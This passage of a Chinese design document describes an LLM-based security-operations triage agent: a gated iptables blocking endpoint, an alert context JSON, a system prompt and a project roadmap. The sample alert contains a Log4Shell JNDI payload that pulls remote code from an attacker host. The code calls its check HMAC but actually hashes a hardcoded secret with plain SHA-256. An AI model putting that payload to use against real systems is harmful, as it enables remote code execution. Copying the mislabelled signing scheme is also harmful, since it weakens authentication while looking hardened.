            \<p style\="font-size: 11px; color: \#64748b; margin-top: 0; margin-bottom: 12px;"\>  
                阻断操作受白名单与数字签名门禁保护。确认阻断将在防护网关下发有时效性（TTL 24小时）的丢弃策略。  
            \</p\>  
            \<a href\="{{ approve\_url }}" class\="btn btn-danger"\>核准执行防御阻断\</a\>  
            \<a href\="{{ dismiss\_url }}" class\="btn btn-secondary"\>判定误报并归档\</a\>  
        \</div\>  
    \</div\>  
\</body\>  
\</html\>

### **Python 防火墙阻断安全门禁设计**

为防止大模型发生幻觉导致重要内部业务资产（如默认网关、DNS 服务器、Kubernetes 控制节点等）被误封禁，阻断执行控制器必须具备严格的代码级安全门禁：  
门禁逻辑必须集成网络拓扑白名单硬校验、HMAC-SHA256 签名与时效性验证，以及下发指令的幂等性控制，全面防止越权执行与自毁性配置变更。

Python  
import ipaddress  
import hmac  
import hashlib  
import subprocess  
import time  
from fastapi import APIRouter, HTTPException, Query, status

router \= APIRouter(prefix="/api/response", tags=\["Response Enforcement"\])

HMAC\_SIGNING\_SECRET \= "SOC\_GATEWAY\_HARDENED\_HMAC\_KEY\_SECURE\_2026"

\# 基础设施硬白名单，禁止任何自动化阻断指令触及  
INFRASTRUCTURE\_WHITELISTS \= \[  
    ipaddress.ip\_network("127.0.0.0/8"),  
    ipaddress.ip\_network("10.0.0.1/32"),        \# 核心默认网关  
    ipaddress.ip\_network("192.168.1.1/32"),     \# 防火墙内网管理接口  
    ipaddress.ip\_network("1.1.1.1/32"),         \# 公共解析服务  
    ipaddress.ip\_network("8.8.8.8/32"),  
\]

def verify\_action\_signature(target\_ip: str, expiration\_ts: int, signature: str) \-\> bool:  
    """验证人工确认链接的防篡改签名与时间有效性"""  
    if time.time() \> expiration\_ts:  
        return False  
    payload \= f"{target\_ip}:{expiration\_ts}:{HMAC\_SIGNING\_SECRET}".encode("utf-8")  
    expected\_sig \= hashlib.sha256(payload).hexdigest()  
    return hmac.compare\_digest(expected\_sig, signature)

@router.post("/block\_ip", summary="Execute Security-Gated IP Containment")  
async def execute\_ip\_block(  
    ip: str \= Query(..., description="Target IPv4 to contain."),  
    expires: int \= Query(..., description="Expiration epoch timestamp."),  
    sig: str \= Query(..., description="HMAC authentication signature.")  
):  
    \# 门禁一：验证防篡改签名与过期时间  
    if not verify\_action\_signature(ip, expires, sig):  
        raise HTTPException(  
            status\_code=status.HTTP\_403\_FORBIDDEN,  
            detail="Security Gate Violation: Action token is invalid, forged, or expired."  
        )

    \# 门禁二：IP 格式有效性与网络基础设施硬白名单校验  
    try:  
        parsed\_ip \= ipaddress.ip\_address(ip)  
    except ValueError:  
        raise HTTPException(  
            status\_code=status.HTTP\_400\_BAD\_REQUEST,  
            detail="Malformed IPv4 address syntax."  
        )

    for protected\_net in INFRASTRUCTURE\_WHITELISTS:  
        if parsed\_ip in protected\_net:  
            raise HTTPException(  
                status\_code=status.HTTP\_403\_FORBIDDEN,  
                detail=f"Security Gate Block: IP {ip} falls into critical protected infrastructure ({protected\_net})."  
            )

    \# 门禁三：幂等性策略下发（以 Linux iptables 为例，规避重复规则堆叠）  
    try:  
        check\_cmd \= \["iptables", "-C", "INPUT", "-s", ip, "-j", "DROP"\]  
        already\_blocked \= subprocess.run(  
            check\_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL  
        ).returncode \== 0

        if not already\_blocked:  
            block\_cmd \= \["iptables", "-I", "INPUT", "1", "-s", ip, "-j", "DROP"\]  
            subprocess.run(block\_cmd, check=True, capture\_output=True, text=True)  
            return {"status": "SUCCESS", "action": "BLOCKED", "target": ip, "message": "Firewall drop rule applied."}  
        else:  
            return {"status": "SKIPPED", "action": "ALREADY\_BLOCKED", "target": ip, "message": "Rule already exists."}  
    except Exception as e:  
        raise HTTPException(  
            status\_code=status.HTTP\_500\_INTERNAL\_SERVER\_ERROR,  
            detail=f"Underlying firewall command execution failure: {str(e)}"  
        )

## **核心数据契约与高保真研判 Prompt 模板**

智能体工程落地的关键前提在于输入与输出接口的强类型结构化。非结构化的研判推演极难作为下游自动化闭环的可靠输入。以下给出了标准的研判上下文输入 JSON 契约以及系统提示词（System Prompt）模板。

### **研判上下文 JSON 契约（Context Contract）**

该报文由中间件编排调度器汇聚组装，涵盖当前捕获的特征告警、ClickHouse 历史时序统计画像、资产元数据、威胁情报信誉以及 RAG 检索返回的 ATT\&CK/CVE 知识切片，为大模型提供结构化的事实输入：

JSON  
{  
  "investigation\_id": "case-20261011-8842",  
  "generated\_at": "2026-10-11T14:22:10Z",  
  "trigger\_alert": {  
    "engine": "Suricata",  
    "signature": "ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228)",  
    "category": "Attempted Administrator Privilege Gain",  
    "severity": 1,  
    "flow": {  
      "src\_ip": "198.51.100.22",  
      "src\_port": 54210,  
      "dest\_ip": "10.0.5.20",  
      "dest\_port": 8080,  
      "proto": "TCP",  
      "app\_proto": "HTTP"  
    },  
    "payload\_snippet": "GET /api/v1/auth HTTP/1.1\\\\r\\\\nUser-Agent: \${jndi:ldap://198.51.100.22:1389/Exploit}\\\\r\\\\nHost: sso.internal.corp\\\\r\\\\n\\\\r\\\\n"  
  },  
  "clickhouse\_behavioral\_context": {  
    "src\_ip\_1h\_baseline": {  
      "total\_connections": 840,  
      "targeted\_unique\_dest\_ips": 15,  
      "targeted\_unique\_dest\_ports": 5,  
      "high\_severity\_alert\_count": 42,  
      "total\_egress\_bytes": 128900,  
      "is\_scanning\_suspect": true  
    },  
    "victim\_asset\_profile": {  
      "hostname": "srv-prod-sso-01",  
      "asset\_tier": "TIER\_1",  
      "exposed\_services": \["nginx/1.24.0", "openjdk-11-spring-boot-core"\],  
      "vulnerabilities": \["CVE-2021-44228: Patch Status Pending"\]  
    },  
    "temporal\_evidence\_chain": \[  
      {  
        "timestamp": "2026-10-11T14:15:02Z",  
        "event\_type": "flow",  
        "description": "TCP syn sweep observed targeting ports 80, 8080, 8888 across subnet 10.0.5.0/24"  
      },  
      {  
        "timestamp": "2026-10-11T14:22:08Z",  
        "event\_type": "alert",  
        "description": "Outbound LDAP request initiated from 10.0.5.20 to 198.51.100.22:1389"  
      }  
    \]  
  },  
  "threat\_intelligence": {  
    "ip\_reputation": {  
      "ip": "198.51.100.22",  
      "reputation\_score": 96,  
      "abuseipdb\_reports": 240,  
      "asn": "AS39351",  
      "threat\_tags": \["Scanner", "Log4j-Hunter", "Known-C2"\]  
    }  
  },  
  "rag\_knowledge\_context": \[  
    {  
      "technique\_id": "T1190",  
      "technique\_name": "Exploit Public-Facing Application",  
      "tactic": "TA0001 \- Initial Access",  
      "reference\_heuristic": "Exploitation of Log4Shell leads to arbitrary code execution; adversaries typically trigger out-of-band LDAP/RMI lookups to pull remote Java bytecode."  
    },  
    {  
      "cve\_id": "CVE-2021-44228",  
      "cvss\_score": 10.0,  
      "recommended\_mitigation": "Disable JNDI lookups via log4j2.formatMsgNoLookups=true or upgrade runtime library."  
    }  
  \]  
}

### **高保真 CoT 研判系统提示词模板**

# **ROLE & PROFESSIONAL DIRECTIVE**

你是一名拥有丰富实战防御经验的资深安全运营架构师（L3 Senior SOC Analyst）。 你的核心任务是审查传入的【研判上下文 JSON 契约】，结合网络日志证据、资产环境特征、威胁情报及 RAG 知识库，完成严谨的因果逻辑研判，推导攻击意图，并给出可直接指导阻断的结构化决策。

# **COGNITIVE CHAIN-OF-THOUGHT (思维链推演规程)**

在生成最终研判结论前，你必须严格按以下逻辑阶段展开思考推演：

> 1. 实体角色定位与边界界定 (Entity Extraction & Delineation)  
   * 提取攻击主体实体：攻击源 IP、归属 ASN、外部情报威胁画像与标签。  
   * 提取受害目标实体：内网受害 IP、被攻击端口、受害资产关键程度等级（Asset Tier）。  
   * 提取载荷利用点：具体的协议入口（如 HTTP Header、URI）、载荷特征特征码（Payload CVE 标识）。  
> 2. 多源证据链交叉验证 (Evidence Corroboration & Validity Check)  
   * 漏洞匹配度核验：对比告警载荷特征与受害资产实际运行的服务组件。如果目标为不受该漏洞影响的组件，则定性为无害尝试或无效探测。  
   * 历史行为相关性核验：结合 ClickHouse 1 小时基线数据，判定攻击源是具备扫描探测历史，还是定向精准打击。  
   * 双向交互特征核验：检查时间链中是否存在受害资产向攻击源发起的异常反弹连接（如 LDAP/RMI 通联），以验证漏洞是否利用成功。  
> 3. 威胁定性与下一步意图推演 (Verdict & Next-Stage Intent Projection)  
   * 威胁性质结论定性：明确标记为 TRUE\_POSITIVE（确认真实攻击）、FALSE\_POSITIVE（误报）、BENIGN\_SCAN（广谱无害噪音扫描）。  
   * 映射 MITRE ATT\&CK 技战术体系（包含 Tactic 编号、Technique ID 及名称）。  
   * 意图假设推演：假设该阶段攻击已得逞，分析攻击者下一步最可能采取的战术步骤（如通过反弹 Shell 建立持久化、凭据窃取或横向平移渗透）。  
> 4. 防护响应与爆炸半径控制 (Containment Strategy & Blast Radius)  
   * 综合考虑目标资产重要性，评估潜在数据泄露与业务中断的爆炸半径。  
   * 评估处置措施：是否建议下发防火墙阻断？阻断目标实体为何？建议的阻断持续周期（TTL）？针对受害主机的应急排查指导。

# **OUTPUT SPECIFICATION**

你必须输出且仅输出一个合法的 JSON 格式字典，严禁包含任何前置或后置的闲聊 Markdown 说明，必须严格遵循以下 JSON Schema 定义：json { "verdict": "TRUE\_POSITIVE | FALSE\_POSITIVE | BENIGN\_SCAN", "confidence\_score": 95, "severity": "CRITICAL | HIGH | MEDIUM | LOW | INFORMATIONAL", "mitre\_attack": { "tactic": "TA0001 \- Initial Access", "technique\_id": "T1190", "technique\_name": "Exploit Public-Facing Application" }, "entities": { "attacker\_ip": "198.51.100.22", "victim\_ip": "10.0.5.20", "victim\_port": 8080, "victim\_asset\_tier": "TIER\_1", "exploited\_cve": "CVE-2021-44228" }, "chain\_of\_thought\_analysis": { "evidence\_validation": "阐述告警载荷如何与资产漏洞特征匹配，引用 ClickHouse 检索到的双向通信记录与情报数据作为直接证据。", "intent\_deduction": "基于当前利用事实，推导攻击者下一步潜在动向（例如：加载恶意 Java class 文件，执行反弹 Shell 并尝试横向扫描内网）。", "blast\_radius\_assessment": "评估当前攻击若未被遏制，对生产核心链路造成的危害与暴露范围。" }, "recommended\_response": { "action": "BLOCK\_IP | ISOLATE\_HOST | ALERT\_ONLY | DISMISS", "target\_entity": "198.51.100.22", "require\_human\_confirmation": true, "block\_duration\_hours": 24, "host\_remediation\_guidance": "检查 10.0.5.20 实例 JVM 运行参数，排查是否产生恶意子进程，并阻断对外的出站 LDAP/RMI 连接。" } }

## **技术链路选型推荐与避坑指南**

结合十周的交付周期与“FastAPI \+ ClickHouse”的轻量化技术约束，工程实现必须聚焦于核心可用闭环，剔除难以收敛的非必要设计，确保系统架构的高内聚与高确定性。

### **最小可用闭环（MVP）与过度设计对比**

在快速迭代周期中，工程选型的首要原则是消除不确定性，将大模型的推理能力严格限定在结构化研判环节，其他数据流转与策略执行全部采用经过工业检验的成熟组件。

| 架构维度 | 必须保留的最小可用闭环（MVP 必备） | 应当坚决放弃的过度设计（Anti-Patterns） |
| :---- | :---- | :---- |
| **流量与日志接入** | 离线使用 Brimcap/Zeek 批处理将 PCAP 转换为 JSON6；通过 ClickHouse HTTP 接口批量导入16。 | 搭建庞大的 Kafka \+ Apache Flink 实时分布式流处理集群；编写自研 C/Go 抓包内核。 |
| **数据湖检索层** | 固化 3 至 5 个高频 FastAPI 工具接口（IP 画像聚合、原始告警检索），配合 Pydantic 强类型参数校验2。 | 采用开放式 Text-to-SQL，允许大模型在数据库上自由生成并执行未经调优的复杂动态 SQL3。 |
| **智能体决策中枢** | 针对单一研判 Agent 设计严密的 CoT 提示词与 JSON 约束输出，实现稳定的两阶段研判1。 | 引入 4 个以上角色的复杂多 Agent 辩论博弈框架（如 AutoGen Swarm）；模型不可控且 Token 成本激增。 |
| **知识库 RAG** | 基于 STIX 规范进行对象级分块20，构建 BM25 稀疏检索与 Dense 向量检索结合的双路混合检索库20。 | 引入全量动态知识图谱（GraphRAG）、构建复杂的 Neo4j 拓扑实时遍历计算。 |
| **响应处置闭环** | FastAPI 发送 Jinja2 渲染的邮件24，通过带防篡改签名与白名单校验的 Webhook 接口执行阻断。 | 追求完全去人化的“无人机防御”全自动永久下发硬件防火墙封禁策略2。 |

### **生产环境常见工程陷阱与避坑指南**

在大模型与底层系统对接的实践中，常出现模型生成异常与系统误操作风险，必须预先部署工程防御策略：  
模型层面的结构化失效与幻觉是普遍存在的风险。开源或商业模型在长上下文下偶发自造虚假 CVE 编号、生成非标准 ATT\&CK 子项编号，或在 JSON 前后输出解释性文本，导致下游解析器崩溃。应对该问题，必须通过底层框架（如 OpenAI 结构化输出模式、Instructor 框架或 PydanticOutputParser）进行模型输出的强制模式反序列化；若捕获到格式校验异常，应触发一次轻量级自纠错重试，禁止非结构化文本直接流入工具执行链路。  
ClickHouse 查询引发的性能衰竭与内存溢出（OOM）风险同样需要防范。若允许智能体执行任意聚集查询，针对未经索引列的扫描可能导致全表数据加载入内存，造成 ClickHouse 节点崩溃。应对方案是在数据库中对频繁聚合的维度（如基于源 IP 的滑动窗口统计）固化为物化视图，且所有 FastAPI 封装的 SQL 查询必须显式设定 max\_execution\_time=5、限制返回行数上限，并由应用程序层通过连接池执行并发限流4。  
误拦截核心业务资产导致业务自残是安全自动化处置中最严重的工程事故。在网络通信中，由于反向代理、统一出口 NAT 或负载均衡器的存在，大量外部攻击报文经过转换后，其传输层源 IP 可能显示为内部核心网关或负载均衡器集群 IP。若智能体研判后直接下发对该源 IP 的网络层丢弃规则，将直接导致整片内网服务中断。应对该风险，在执行阻断的工具接口中必须硬编码不可绕过的核心基础设施与内部保留网段白名单；针对指向内部保留地址的阻断请求，系统必须强制拦截并自动降级为“仅告警并邮件提醒人工核验”，绝对禁止自动化直接执行阻断3。

### **十周研发周期推进路线图**

为了保障项目在有限周期内保质交付，推荐采用双周递进的敏捷研发节奏，以标准化契约驱动前后链路并行研发：

| 迭代阶段 | 时间周期 | 阶段核心目标 | 关键工程产出物与交付里程碑 |
| :---- | :---- | :---- | :---- |
| **阶段一** | 第 1 \- 2 周 | 数据底座搭建与流量仿真 | 落地 Brimcap/Zeek 批处理工具6；部署 ClickHouse 实例，完成 DDL 建表、物化视图与 CIC-IDS2017 数据注入8。 |
| **阶段二** | 第 3 \- 4 周 | 工具适配层与知识库 RAG | 开发 FastAPI 数据反查工具端点3；完成 MITRE ATT\&CK STIX 数据对象切分，构建稠密/稀疏混合向量索引20。 |
| **阶段三** | 第 5 \- 6 周 | 研判智能体认知中枢调优 | 建立上下文装配中台，实现 CoT 研判 Prompt 模板；针对典型攻击与良性扫描样本多轮测试，收敛判定准确率。 |
| **阶段四** | 第 7 \- 8 周 | 报告渲染与阻断门禁联动 | 研发基于 Jinja2 的 HTML 邮件生成服务24；部署具备 HMAC 签名与白名单硬拦截的安全阻断接口，打通人工确认链路。 |
| **阶段五** | 第 9 \- 10 周 | 链路端到端集成与攻防验证 | 执行全链路自动化集成测试；回放复杂多阶段混合攻击流量，评估端到端研判延迟、Token 消耗比率与异常容错韧性。 |

#### **引用的著作**

> 1. FunnyWolf/agentic-soc-platform \- GitHub, [https\://github.com/FunnyWolf/agentic-soc-platform](https://github.com/FunnyWolf/agentic-soc-platform)  
> 2. GitHub \- M507/AI-SOC-Agent: Blackhat 2025 presentation and, [https\://github.com/M507/ai-soc-agent](https://github.com/M507/ai-soc-agent)  
> 3. GitHub \- Aaniket09/AI-SOC-Agent, [https\://github.com/Aaniket09/AI-SOC-Agent](https://github.com/Aaniket09/AI-SOC-Agent)  
> 4. GitHub \- mapap9/AI-SOC-Agent: A written explanation and example, [https\://github.com/mapap9/SOC-Agentic-AI](https://github.com/mapap9/SOC-Agentic-AI)  
> 5. mrwadams/attackgen \- GitHub, [https\://github.com/mrwadams/attackgen](https://github.com/mrwadams/attackgen)  
> 6. GitHub \- brimdata/brimcap: Convert pcap files into richly-typed ZNG, [https\://github.com/brimdata/brimcap](https://github.com/brimdata/brimcap)  
> 7. Node Configuration | Tenzir Documentation, [https\://tenzir.com/docs/reference/node/configuration/](https://tenzir.com/docs/reference/node/configuration/)  
> 8. Explainable Intrusion and Anomaly Detection for IoT Sensor ... \- PMC, [https\://pmc.ncbi.nlm.nih.gov/articles/PMC13417414/](https://pmc.ncbi.nlm.nih.gov/articles/PMC13417414/)  
> 9. Towards Real-Time Network Intrusion Detection With Image-Based, [https\://www\.computer.org/csdl/journal/bd/2025/01/10535236/1X6bgCJeSJy](https://www.computer.org/csdl/journal/bd/2025/01/10535236/1X6bgCJeSJy)  
> 10. Methods for network intrusion detection \- DiVA portal, [https\://www\.diva-portal.org/smash/get/diva2:1678699/FULLTEXT01.pdf](https://www.diva-portal.org/smash/get/diva2:1678699/FULLTEXT01.pdf)  
> 11. golchinpg/CML-IDS: This is the code of CML-IDS · GitHub \- GitHub, [https\://github.com/golchinpg/CML-IDS](https://github.com/golchinpg/CML-IDS)  
> 12. wangtz19/Awesome-NTA: A curation of awesome papers ... \- GitHub, [https\://github.com/wangtz19/Awesome-NTA](https://github.com/wangtz19/Awesome-NTA)  
> 13. GitHub \- christophercruz98112/packetEye: Machine Learning live, [https\://github.com/christophercruz98112/packetEye](https://github.com/christophercruz98112/packetEye)  
> 14. Can generate CIC-IDS 2017 dataset fields with suricata? \- Help, [https\://forum.suricata.io/t/can-generate-cic-ids-2017-dataset-fields-with-suricata/2685](https://forum.suricata.io/t/can-generate-cic-ids-2017-dataset-fields-with-suricata/2685)  
> 15. read\_yaml | Tenzir Documentation, [https\://docs.tenzir.com/reference/operators/read\_yaml/](https://docs.tenzir.com/reference/operators/read_yaml/)  
> 16. The Complete A-to-Z ClickHouse Deployment Guide on Ubuntu, [https\://abusaeid.medium.com/the-complete-a-to-z-clickhouse-deployment-guide-on-ubuntu-installation-security-and-optimization-2ed490a77c78](https://abusaeid.medium.com/the-complete-a-to-z-clickhouse-deployment-guide-on-ubuntu-installation-security-and-optimization-2ed490a77c78)  
> 17. Cyber security Data Analytics Solutions \- TeraDB Cloud, [https\://www\.teradbcloud.com/solutions/cyber-security-data-analytics/](https://www.teradbcloud.com/solutions/cyber-security-data-analytics/)  
> 18. soc-automation · GitHub Topics, [https\://github.com/topics/soc-automation?l=html](https://github.com/topics/soc-automation?l=html)  
> 19. Shuffle: A general purpose security automation platform ... \- GitHub, [https\://github.com/shuffle/shuffle](https://github.com/shuffle/shuffle)  
> 20. Enhancing RMF and ATT\&CK Mapping Accuracy Through ... \- MDPI, [https\://www\.mdpi.com/2079-9292/15/6/1248](https://www.mdpi.com/2079-9292/15/6/1248)  
> 21. Automate Cybersecurity Analysis with n8n and MITRE ATT\&CK, [https\://buldrr.com/workflows/automate-cybersecurity-analysis-n8n-mitre-attack](https://buldrr.com/workflows/automate-cybersecurity-analysis-n8n-mitre-attack)  
> 22. Building Cybersecurity AI Assistant Using LLMs \- Acalvio, [https\://www\.acalvio.com/wp-content/uploads/acalvio-cybersecurity-ai-assist.pdf](https://www.acalvio.com/wp-content/uploads/acalvio-cybersecurity-ai-assist.pdf)  
> 23. CVE Threat Intelligence Toolkit is a research-support ... \- GitHub, [https\://github.com/Wong-Kai-Xian/CVE\_Threat\_Intelligence\_Toolkit](https://github.com/Wong-Kai-Xian/CVE_Threat_Intelligence_Toolkit)  
> 24. malwarekid/SOAR-Flow: SOAR Automation with Shuffle, Wazuh, [https\://github.com/malwarekid/SOAR-Flow](https://github.com/malwarekid/SOAR-Flow)  
> 25. soar · GitHub Topics, [https\://github.com/topics/soar](https://github.com/topics/soar)  
> 26. shuffle-docs/docs/workflows.md at master \- GitHub, [https\://github.com/shuffle/shuffle-docs/blob/master/docs/workflows.md](https://github.com/shuffle/shuffle-docs/blob/master/docs/workflows.md)